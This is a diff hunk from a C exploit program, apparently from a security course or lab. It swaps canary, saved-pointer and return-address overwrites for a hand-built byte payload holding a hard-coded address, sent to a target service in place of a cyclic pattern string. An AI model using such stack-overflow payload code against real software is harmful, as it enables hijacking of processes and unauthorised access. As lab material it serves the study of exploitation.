@@ -183,17 +183,29 @@ int main(int argc, char* argv[]) {
    // being assembled on the same architecture/OS as the process being
    // exploited.
 
-   expl[auth_canary_user_diff/sizeof(void*)] = (void*)cur_canary;
-   expl[auth_bp_user_diff/sizeof(void*)] = 
-      (void*)(cur_mainloop_bp - mainloop_auth_bp_diff);
-   expl[auth_ra_user_diff/sizeof(void*)] = 
-      (void*)(cur_mainloop_ra - mainloop_auth_ra_diff);
-   expl[g_authd_auth_user_diff/sizeof(void*)] = 1;
+   //expl[auth_canary_user_diff/sizeof(void*)] = (void*)cur_canary;
+   //expl[auth_bp_user_diff/sizeof(void*)] = (void*)(cur_mainloop_bp - mainloop_auth_bp_diff);
+   //expl[auth_ra_user_diff/sizeof(void*)] = (void*)(cur_mainloop_ra - mainloop_auth_ra_diff);
+   //expl[g_authd_auth_user_diff/sizeof(void*)] = 1;
+
+   // currently the max length of expl is explsz, which is declared few lines above
+   ((char*)expl)[0] = 'p';
+   ((char*)expl)[1] = ' ';
+
+   ((char*)expl)[7] = 0x08;
+   ((char*)expl)[8] = 0x04;
+   ((char*)expl)[9] = 0x9a;
+   ((char*)expl)[10] = 0x9f;
+   
    
    // Now, send the payload
    put_str("u asdfsa\n");
    send(); 
-   put_str("p 1111BBBBAa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah00BBBBh9Ai0Ai1Ai2Ai3Ai4");
+
+   // 20 is the number of bytes you are putting. It will put from expl[0] to expl[19], if you need more then increase this.
+   // More general usage is putting variable explsz, because the exploit payload created is explsz bytes long.
+   put_bin(expl, 20);
+   //put_str("p 1111BBBBAa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah00BBBBh9Ai0Ai1Ai2Ai3Ai4");
    send();
    
    // memset((void *)0x8049a9f, 'A', 738077976);
